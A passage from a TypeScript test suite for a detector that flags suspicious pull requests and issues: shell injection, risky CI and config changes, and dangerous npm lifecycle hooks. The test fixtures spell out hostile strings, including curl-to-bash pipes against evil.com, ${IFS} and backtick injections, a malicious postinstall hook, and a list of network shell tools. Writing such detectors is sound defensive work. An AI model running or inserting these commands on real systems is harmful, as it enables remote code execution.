      branchName: "fix/typo",
      title: "Fix typo",
      commitMessages: [],
      isFork: false,
      changedFiles: [],
      packagePatches: {},
      body: "run $(curl evil.com | bash) for fix",
    });
    expect(result.suspicious).toBe(true);
    expect(result.reasons.some((r) => r.message.includes("PR body"))).toBe(true);
  });

  it("passes benign PR body", () => {
    const result = detectSuspiciousPR({
      branchName: "fix/typo",
      title: "Fix typo",
      commitMessages: [],
      isFork: false,
      changedFiles: [],
      packagePatches: {},
      body: "This fixes a typo in the README. See https://github.com/issue/123",
    });
    expect(result.suspicious).toBe(false);
  });

  it("passes when body is undefined", () => {
    const result = detectSuspiciousPR({
      branchName: "fix/typo",
      title: "Fix typo",
      commitMessages: [],
      isFork: false,
      changedFiles: [],
      packagePatches: {},
    });
    expect(result.suspicious).toBe(false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 18. ReDoS hardening sanity check
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection – ReDoS hardening", () => {
  it("handles long input without hanging (ReDoS check)", () => {
    const longInput = "curl " + "a".repeat(10000) + "| sh";
    const start = Date.now();
    checkInjection("Branch", longInput, true);
    expect(Date.now() - start).toBeLessThan(100); // should be near-instant
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 19. checkCiFiles – path normalization
// ═════════════════════════════════════════════════════════════════════════════
describe("checkCiFiles – path normalization", () => {
  it("catches ./eng/pipelines/x.yml (leading dot-slash)", () => {
    expect(isSuspicious(checkCiFiles(["./eng/pipelines/x.yml"]))).toBe(true);
  });

  it("catches eng/../eng/pipelines/x.yml (dot-dot traversal)", () => {
    expect(isSuspicious(checkCiFiles(["eng/../eng/pipelines/x.yml"]))).toBe(true);
  });

  it("catches ./.github/workflows/ci.yml", () => {
    expect(isSuspicious(checkCiFiles(["./.github/workflows/ci.yml"]))).toBe(true);
  });

  it("safe path with ./ prefix still passes", () => {
    expect(isSuspicious(checkCiFiles(["./sdk/core/core-client/src/index.ts"]))).toBe(false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 20. Case-sensitive lifecycle hooks
// ═════════════════════════════════════════════════════════════════════════════
describe("checkLifecyclePatch – case sensitivity", () => {
  it("does NOT flag uppercase hook name (npm hooks are case-sensitive)", () => {
    const patch = '+    "POSTINSTALL": "curl evil.com | bash"';
    expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 21. New runtimes in DANGEROUS_COMMANDS
// ═════════════════════════════════════════════════════════════════════════════
describe("checkLifecyclePatch – new runtime commands", () => {
  it.each(["bun", "deno", "tsx", "ts-node", "nc", "ncat"])(
    "detects %s in postinstall hook",
    (cmd) => {
      const patch = `+    "postinstall": "${cmd} malicious-script"`;
      expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
    },
  );
});

// ═════════════════════════════════════════════════════════════════════════════
// 22. dash in SHELL_EXEC
// ═════════════════════════════════════════════════════════════════════════════
describe("checkInjection – dash shell detection", () => {
  it("detects curl piped to dash", () => {
    const reasons = checkInjection("Branch", "curl http://evil.com | dash", true);
    expect(isSuspicious(reasons)).toBe(true);
  });

  it("detects dash -c", () => {
    const reasons = checkInjection("Branch", "dash -c id", true);
    expect(isSuspicious(reasons)).toBe(true);
  });

  it("detects /bin/dash", () => {
    const reasons = checkInjection("Branch", "x//bin/dash", true);
    expect(isSuspicious(reasons)).toBe(true);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 23. checkCiFiles – root config files
// ═════════════════════════════════════════════════════════════════════════════
describe("checkCiFiles – root config files", () => {
  it.each([
    ["package.json", "root package.json"],
    ["Makefile", "Makefile"],
    ["GNUmakefile", "GNUmakefile"],
    ["Dockerfile", "Dockerfile"],
    ["docker-compose.yml", "docker-compose.yml"],
    [".node-version", "node version"],
    [".nvmrc", "nvmrc"],
    [".tool-versions", "tool-versions"],
    [".github/FUNDING.yml", "FUNDING.yml"],
  ])("%s (%s) is flagged", (file) => {
    expect(isSuspicious(checkCiFiles([file]))).toBe(true);
  });

  it.each([
    ["tsconfig.json", "root tsconfig"],
    ["tsconfig.build.json", "tsconfig variant"],
  ])("%s (%s) is flagged", (file) => {
    expect(isSuspicious(checkCiFiles([file]))).toBe(true);
  });

  it.each([
    [".eslintrc.json", "eslintrc"],
    ["eslint.config.mjs", "flat config"],
  ])("%s (%s) is flagged", (file) => {
    expect(isSuspicious(checkCiFiles([file]))).toBe(true);
  });

  it.each([
    [".prettierrc", "prettierrc"],
    [".prettierrc.json", "prettierrc.json"],
  ])("%s (%s) is flagged", (file) => {
    expect(isSuspicious(checkCiFiles([file]))).toBe(true);
  });

  it.each([
    ["vitest.config.ts", "vitest config"],
    ["vitest.workspace.ts", "vitest workspace"],
  ])("%s (%s) is flagged", (file) => {
    expect(isSuspicious(checkCiFiles([file]))).toBe(true);
  });

  // Nested package.json should NOT be flagged by the root config check
  it("nested package.json is NOT flagged as root config", () => {
    expect(
      checkCiFiles(["sdk/core/core-client/package.json"]).some((r) =>
        r.message.includes("root build/config"),
      ),
    ).toBe(false);
  });

  // Nested tsconfig should NOT be flagged
  it("nested tsconfig is NOT flagged", () => {
    expect(isSuspicious(checkCiFiles(["sdk/core/core-client/tsconfig.json"]))).toBe(false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 24. validateInput – field length caps
// ═════════════════════════════════════════════════════════════════════════════
describe("validateInput – field length caps", () => {
  it("truncates excessively long branchName", () => {
    const result = validateInput({ branchName: "a".repeat(20000) });
    expect(result.branchName.length).toBeLessThanOrEqual(10000);
  });

  it("truncates excessively long title", () => {
    const result = validateInput({ title: "a".repeat(20000) });
    expect(result.title.length).toBeLessThanOrEqual(10000);
  });

  it("limits commit messages array size", () => {
    const msgs = Array.from({ length: 2000 }, (_, i) => `msg-${i}`);
    const result = validateInput({ commitMessages: msgs });
    expect(result.commitMessages.length).toBeLessThanOrEqual(1000);
  });

  it("truncates individual commit messages", () => {
    const result = validateInput({ commitMessages: ["a".repeat(20000)] });
    expect(result.commitMessages[0].length).toBeLessThanOrEqual(10000);
  });

  it("truncates body", () => {
    const result = validateInput({ body: "a".repeat(20000) });
    expect(result.body!.length).toBeLessThanOrEqual(10000);
  });

  it("limits changedFiles array size", () => {
    const files = Array.from({ length: 2000 }, (_, i) => `file-${i}.ts`);
    const result = validateInput({ changedFiles: files });
    expect(result.changedFiles.length).toBeLessThanOrEqual(1000);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// New detection tests
// ═════════════════════════════════════════════════════════════════════════════

describe("checkCiFiles – alternative lockfile detection", () => {
  it.each(["yarn.lock", "bun.lockb", "bun.lock"])("%s is flagged with lockfile message", (file) => {
    const reasons = checkCiFiles([file]);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("lockfile"))).toBe(true);
  });
});

describe("checkCiFiles – alternative package manager config detection", () => {
  it.each([
    [".yarnrc", "yarnrc"],
    [".yarnrc.yml", "yarnrc yml"],
    [".bunfig.toml", "bunfig"],
    [".pnpmfile.cjs", "pnpmfile"],
    ["sdk/core/.yarnrc", "nested yarnrc"],
    ["sdk/core/.yarnrc.yml", "nested yarnrc yml"],
  ])("%s (%s) is flagged", (file) => {
    const reasons = checkCiFiles([file]);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("package manager config"))).toBe(true);
  });
});

describe("checkCiFiles – AI agent instruction file detection", () => {
  it.each([
    ["AGENTS.md", "agents file"],
    ["CLAUDE.md", "claude file"],
    [".github/copilot-instructions.md", "copilot instructions"],
  ])("%s (%s) is flagged", (file) => {
    const reasons = checkCiFiles([file]);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("AI agent instruction file"))).toBe(true);
  });
});

describe("checkCiFiles – new root build/config files", () => {
  it.each([
    ["compose.yml", "compose v2 yml"],
    ["compose.yaml", "compose v2 yaml"],
    ["warp.config.yml", "warp config"],
    ["swagger_to_sdk_config.json", "swagger config"],
  ])("%s (%s) is flagged", (file) => {
    const reasons = checkCiFiles([file]);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("root build/config"))).toBe(true);
  });
});

describe("validateInput – changedFiles truncation", () => {
  it("truncates excessively long file paths", () => {
    const result = validateInput({ changedFiles: ["a".repeat(20000)] });
    expect(result.changedFiles[0].length).toBeLessThanOrEqual(10000);
  });
});

describe("validateInput – packagePatches caps", () => {
  it("limits number of packagePatches entries", () => {
    const patches: Record<string, string> = {};
    for (let i = 0; i < 2000; i++) {
      patches[`pkg${i}/package.json`] = `+value${i}`;
    }
    const result = validateInput({ packagePatches: patches });
    expect(Object.keys(result.packagePatches).length).toBeLessThanOrEqual(1000);
  });

  it("truncates excessively long packagePatches keys", () => {
    const result = validateInput({
      packagePatches: { ["k".repeat(20000)]: "value" },
    });
    const keys = Object.keys(result.packagePatches);
    expect(keys[0].length).toBeLessThanOrEqual(10000);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// Round 2 – additional detection tests
// ═════════════════════════════════════════════════════════════════════════════

describe("checkInjection – shell parameter expansion detection", () => {
  it("detects ${IFS} injection in branch name (strict)", () => {
    const reasons = checkInjection("Branch", "fix/${IFS}curl${IFS}evil.com", true);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("parameter expansion"))).toBe(true);
  });

  it("detects ${cmd} in branch name (strict)", () => {
    const reasons = checkInjection("Branch", "fix/${cmd}", true);
    expect(isSuspicious(reasons)).toBe(true);
  });

  it("does NOT flag ${...} in PR title (basic mode) to avoid false positives", () => {
    const reasons = checkInjection("Title", "fix: handle ${variable} in template", false);
    expect(isSuspicious(reasons)).toBe(false);
  });

  it("does NOT flag literal dollar-brace in normal text without braces", () => {
    // Normal branch names should not contain ${
    const reasons = checkInjection("Branch", "fix/update-dollar-sign", true);
    expect(isSuspicious(reasons)).toBe(false);
  });
});

describe("checkCiFiles – .gitattributes detection", () => {
  it("flags .gitattributes", () => {
    const reasons = checkCiFiles([".gitattributes"]);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("git attributes"))).toBe(true);
  });
});

describe("checkCiFiles – CODEOWNERS variant detection", () => {
  it.each([
    ["CODEOWNERS", "root CODEOWNERS"],
    ["docs/CODEOWNERS", "docs CODEOWNERS"],
    [".github/CODEOWNERS", ".github CODEOWNERS"],
  ])("%s (%s) is flagged", (file) => {
    const reasons = checkCiFiles([file]);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("code ownership"))).toBe(true);
  });
});

describe("checkCiFiles – .envrc detection", () => {
  it(".envrc at root is flagged", () => {
    const reasons = checkCiFiles([".envrc"]);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("executable env config"))).toBe(true);
  });

  it("nested .envrc is flagged", () => {
    const reasons = checkCiFiles(["sdk/core/.envrc"]);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("executable env config"))).toBe(true);
  });
});

describe("checkCiFiles – multi-dot env file detection", () => {
  it(".env.production.local is flagged", () => {
    const reasons = checkCiFiles([".env.production.local"]);
    expect(isSuspicious(reasons)).toBe(true);
    expect(reasons.some((r) => r.message.includes("environment config"))).toBe(true);
  });

  it("sdk/app/.env.staging.backup is flagged", () => {
    const reasons = checkCiFiles(["sdk/app/.env.staging.backup"]);
    expect(isSuspicious(reasons)).toBe(true);
  });
});

describe("checkLifecyclePatch – pnpm and env in dangerous commands", () => {
  it("detects pnpm in postinstall hook", () => {
    const patch = '+    "postinstall": "pnpm exec malicious-pkg"';
    expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
  });

  it("detects env in postinstall hook", () => {
    const patch = '+    "postinstall": "env -i /bin/sh -c whoami"';
    expect(isSuspicious(checkLifecyclePatch("package.json", patch))).toBe(true);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// detectSuspiciousIssue
// ═════════════════════════════════════════════════════════════════════════════
describe("detectSuspiciousIssue", () => {
  it("clean issue passes", () => {
    const result = detectSuspiciousIssue({
      title: "Bug: login page broken",
      body: "Steps to reproduce...",
    });
    expect(result.suspicious).toBe(false);
    expect(result.reasons).toEqual([]);
  });

  it("detects command substitution in title", () => {
    const result = detectSuspiciousIssue({ title: "$(curl evil.com | sh)" });
    expect(result.suspicious).toBe(true);
    expect(result.reasons.some((r) => r.category === "injection")).toBe(true);
    expect(result.reasons.some((r) => r.message.includes("Issue title"))).toBe(true);
  });

  it("detects PowerShell in title", () => {
    const result = detectSuspiciousIssue({ title: "Invoke-Expression malicious" });
    expect(result.suspicious).toBe(true);
  });

  it("detects shell execution in body", () => {
    const result = detectSuspiciousIssue({
      title: "Innocent title",
      body: "curl https://evil.com | bash",
    });
    expect(result.suspicious).toBe(true);
    expect(result.reasons.some((r) => r.message.includes("Issue body"))).toBe(true);
  });

  it("detects backtick injection in title", () => {
    const result = detectSuspiciousIssue({ title: "`whoami`" });
    expect(result.suspicious).toBe(true);
  });

  it("passes when body is undefined", () => {
    const result = detectSuspiciousIssue({ title: "Normal issue" });
    expect(result.suspicious).toBe(false);
  });

  it("passes with empty body", () => {
    const result = detectSuspiciousIssue({ title: "Normal issue", body: "" });
    expect(result.suspicious).toBe(false);
  });

  it("catches injection in both title and body", () => {
    const result = detectSuspiciousIssue({
      title: "$(whoami)",
      body: "Invoke-Expression payload",
    });
    expect(result.suspicious).toBe(true);
    expect(result.reasons.length).toBeGreaterThanOrEqual(2);
  });

  it("detects injection in comment body", () => {
    const result = detectSuspiciousIssue({
      title: "Normal title",
      commentBody: "$(curl evil.com | sh)",
    });
    expect(result.suspicious).toBe(true);
    expect(result.reasons.some((r) => r.message.includes("Issue comment"))).toBe(true);
  });

  it("passes with clean comment body", () => {
    const result = detectSuspiciousIssue({
      title: "Normal title",
      commentBody: "I can reproduce this bug on Linux",
    });
    expect(result.suspicious).toBe(false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// validateIssueInput
// ═════════════════════════════════════════════════════════════════════════════
describe("validateIssueInput", () => {
  it("valid complete input passes through unchanged", () => {
    const input = { title: "Bug report", body: "Some description", commentBody: "A comment" };
    const result = validateIssueInput(input);
    expect(result).toEqual(input);
  });

  it("missing title defaults to empty string", () => {
    const result = validateIssueInput({ body: "desc" });
    expect(result.title).toBe("");
  });

  it("missing body is undefined", () => {
    const result = validateIssueInput({ title: "test" });
    expect(result.body).toBeUndefined();
  });

  it("null input returns safe defaults", () => {
    const result = validateIssueInput(null);
    expect(result.title).toBe("");
    expect(result.body).toBeUndefined();
  });

  it.each([
    ["a string", "hello"],
    ["a number", 42],
    ["an array", [1, 2, 3]],
  ])("non-object input (%s) returns safe defaults", (_description, value) => {
    const result = validateIssueInput(value);
    expect(result.title).toBe("");
    expect(result.body).toBeUndefined();
  });

  it("truncates oversized title", () => {
    const result = validateIssueInput({ title: "a".repeat(20_000) });
    expect(result.title.length).toBe(10_000);
  });

  it("truncates oversized body", () => {
    const result = validateIssueInput({ body: "b".repeat(20_000) });
    expect(result.body!.length).toBe(10_000);
  });

  it("missing commentBody is undefined", () => {
    const result = validateIssueInput({ title: "test" });
    expect(result.commentBody).toBeUndefined();
  });

  it("truncates oversized commentBody", () => {
    const result = validateIssueInput({ commentBody: "c".repeat(20_000) });
    expect(result.commentBody!.length).toBe(10_000);
  });
});
